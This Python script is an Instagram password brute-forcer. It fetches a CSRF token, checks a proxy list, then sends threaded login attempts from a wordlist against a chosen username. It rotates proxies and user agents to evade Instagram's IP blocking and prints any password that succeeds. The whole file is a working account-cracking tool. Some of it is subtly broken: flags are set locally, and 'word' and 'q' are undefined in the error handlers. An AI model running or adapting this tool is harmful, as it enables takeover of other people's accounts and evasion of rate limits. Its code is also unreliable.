# coding=utf-8
###############################################################################
# Instagram Brute Forcer
# Developed By RetroAk 
# RetroAk@jabber.de
# !/usr/bin/python
###############################################################################

from __future__ import print_function
import argparse
import logging
import random
import socket
import sys
import threading

try:
    import urllib.request as rq
    from urllib.error import HTTPError
    import urllib.parse as http_parser
except ImportError:
    import urllib2 as rq
    from urllib2 import HTTPError
    import urllib as http_parser

try:
    import queue as Queue
except ImportError:
    import Queue


class bcolors:
    HEADER = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def check_proxy(q):
    """
    Check proxy and append to working proxies
    """
    while not q.empty():
        proxy = q.get().strip()

        try:
            opener = rq.build_opener(
                rq.ProxyHandler({'https': 'https://' + proxy}),
                rq.HTTPHandler(),
                rq.HTTPSHandler()
            )
            opener.addheaders = [('User-agent', 'Mozilla/5.0')]
            rq.install_opener(opener)

            req = rq.Request('https://api.ipify.org/')
            if rq.urlopen(req).read().decode() == proxy.split(':')[0]:
                proxys_working_list[proxy] = proxy
                if _verbose:
                    print(f"{bcolors.OKGREEN} --[+] {proxy} | PASS{bcolors.ENDC}")
            else:
                if _verbose:
                    print(f" --[!] {proxy} | FAILED")

        except Exception as err:
            if _verbose:
                print(f" --[!] {proxy} | FAILED")
            if _debug:
                logger.error(err)
            continue


def get_csrf():
    """
    Get CSRF token from login page for POST requests
    """
    global csrf_token

    print(f"{bcolors.WARNING}[+] Getting CSRF Token:{bcolors.ENDC}")

    try:
        opener = rq.build_opener(rq.HTTPHandler(), rq.HTTPSHandler())
        opener.addheaders = [('User-agent', 'Mozilla/5.0')]
        rq.install_opener(opener)

        request = rq.Request('https://www.instagram.com/')
        headers = rq.urlopen(request).info().get_all('Set-Cookie', [])

        for header in headers:
            if 'csrftoken' in header:
                csrf_token = header.split(';')[0].split('=')[1]
                print(f"{bcolors.OKGREEN}[+] CSRF Token: {csrf_token}{bcolors.ENDC}")
                return

    except Exception as err:
        print(f"{bcolors.FAIL}[!] Can't get CSRF token, please use -d for debug{bcolors.ENDC}")
        if _debug:
            logger.error(err)
        print(f"{bcolors.FAIL}[!] Exiting...{bcolors.ENDC}")
        sys.exit(3)


def brute(q):
    """
    Main worker function for brute-forcing
    """
    while not q.empty():
        try:
            proxy = random.choice(list(proxys_working_list)) if proxys_working_list else None
            word = q.get().strip()

            post_data = {'username': USER, 'password': word}
            header = {
                "User-Agent": random.choice(user_agents),
                'X-Instagram-AJAX': '1',
                "X-CSRFToken": csrf_token,
                "X-Requested-With": "XMLHttpRequest",
                "Referer": "https://www.instagram.com/",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                'Cookie': f'csrftoken={csrf_token}'
            }

            if proxy:
                if _verbose:
                    print(f"{bcolors.BOLD}[*] Trying {word} | {proxy}{bcolors.ENDC}")

                opener = rq.build_opener(
                    rq.ProxyHandler({'https': 'https://' + proxy}),
                    rq.HTTPHandler(),
                    rq.HTTPSHandler()
                )
            else:
                if _verbose:
                    print(f"{bcolors.BOLD}[*] Trying {word}{bcolors.ENDC}")

                opener = rq.build_opener(rq.HTTPHandler(), rq.HTTPSHandler())

            rq.install_opener(opener)
            req = rq.Request(URL, data=http_parser.urlencode(post_data).encode('ascii'), headers=header)
            response = rq.urlopen(req)

            if '"authenticated": true' in response.read().decode():
                print_success_login(word)
                found_flag = True
                q.queue.clear()
                return

        except HTTPError as e:
            handle_http_error(e, proxy)
            continue

        except Exception as err:
            handle_unknown_error(err)
            continue


def print_success_login(password):
    print(f"{bcolors.OKGREEN}{bcolors.BOLD}\n[*] Successful Login:")
    print("---------------------------------------------------")
    print(f"[!] Username: {USER}")
    print(f"[!] Password: {password}")
    print("---------------------------------------------------\n" + bcolors.ENDC)


def handle_http_error(e, proxy):
    error_code = e.getcode()
    error_message = e.read().decode("utf8", 'ignore')

    if error_code in [400, 403] and '"checkpoint_required"' in error_message:
        print_checkpoint_required(proxy)
        found_flag = True
    elif proxy:
        print_proxy_jail(proxy)
    else:
        print_ip_jail()

    q.task_done()


def print_checkpoint_required(proxy):
    print(f"{bcolors.OKGREEN}{bcolors.BOLD}\n[*] Successful Login "
          f"{bcolors.FAIL}But need Checkpoint :|{bcolors.OKGREEN}")
    print("---------------------------------------------------")
    print(f"[!] Username: {USER}")
    print(f"[!] Password: {word}")
    print("---------------------------------------------------\n{bcolors.ENDC}")


def print_proxy_jail(proxy):
    print(f"{bcolors.WARNING}[!] Error: Proxy IP {proxy} is now on Instagram jail. "
          f"Removing from working list!{bcolors.ENDC}")
    proxys_working_list.pop(proxy, None)
    print(f"{bcolors.OKGREEN}[+] Online Proxy: {len(proxys_working_list)}{bcolors.ENDC}")


def print_ip_jail():
    print(f"{bcolors.FAIL}[!] Error: Your IP is now on Instagram jail. "
          f"Script will not work until you change your IP or use a proxy{bcolors.ENDC}")


def handle_unknown_error(err):
    if _debug:
        logger.error(err)
        print(f"{bcolors.FAIL}[!] Unknown Error in request.{bcolors.ENDC}")
    else:
        print(f"{bcolors.FAIL}[!] Unknown Error in request, please turn on debug mode with -d{bcolors.ENDC}")


def starter():
    """
    Initialize threading workers
    """
    global found_flag

    queue = Queue.Queue()
    threads = []
    found_flag = False

    print(f"{bcolors.HEADER}\n[!] Initializing Workers")
    print(f"[!] Start Cracking ... \n{bcolors.ENDC}")

    try:
        for word in words:
            queue.put(word)

        while not queue.empty():
            for _ in range(THREAD):
                thread = threading.Thread(target=brute, args=(queue,))
                thread.setDaemon(True)
                thread.start()
                threads.append(thread)

            for thread in threads:
                thread.join()

            if found_flag:
                break

        print(f"{bcolors.OKGREEN}\n--------------------")
        print("[!] Brute complete!" + bcolors.ENDC)

    except Exception as err:
        print(err)


def check_available_proxies(proxies):
    """
    Check available proxies from proxy_list file
    """
    socket.setdefaulttimeout(30)
    global proxys_working_list

    print(f"{bcolors.WARNING}[-] Testing Proxy List...\n{bcolors.ENDC}")
    proxys_working_list = {}
    queue = Queue.Queue()
    threads = []

    for proxy in proxies:
        queue.put(proxy)

    while not queue.empty():
        for _ in range(THREAD):
            thread = threading.Thread(target=check_proxy, args=(queue,))
            thread.setDaemon(True)
            thread.start()
            threads.append(thread)

        for thread in threads:
            thread.join()

    print(f"{bcolors.OKGREEN}[+] Online Proxy: {bcolors.BOLD}{len(proxys_working_list)}{bcolors.ENDC}\n")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Instagram BruteForcer",
        epilog="./instabrute -u user_test -w words.txt -p proxys.txt -t 4 -d -v"
    )

    parser.add_argument('-u', '--username', action="store", required=True, help='Target Username')
    parser.add_argument('-w', '--word', action="store", required=True, help='Words list path')
    parser.add_argument('-p', '--proxy', action="store", required=True, help='Proxy list path')
    parser.add_argument('-t', '--thread', help='Thread', type=int, default=4)
    parser.add_argument('-v', '--verbose', action='store_const', help='Verbose mode', const=True, default=False)
    parser.add_argument('-d', '--debug', action='store_const', const=True, help='Debug mode', default=False)
    args = parser.parse_args()

    USER = args.username
    THREAD = args.thread
    _verbose = args.verbose
    _debug = args.debug

    if _debug:
        logging.basicConfig(level=logging.DEBUG, filename='debug.log')
        logger = logging.getLogger('instabrute')

    URL = "https://www.instagram.com/accounts/login/ajax/"
    user_agents = [
        'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',
        'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0 Safari/600.2.5'
    ]

    # Get the CSRF token and process proxy and word list files
    get_csrf()
    with open(args.proxy, "r") as f:
        proxys = f.read().splitlines()

    with open(args.word, "r") as f:
        words = f.read().splitlines()

    if proxys:
        check_available_proxies(proxys)

    starter()
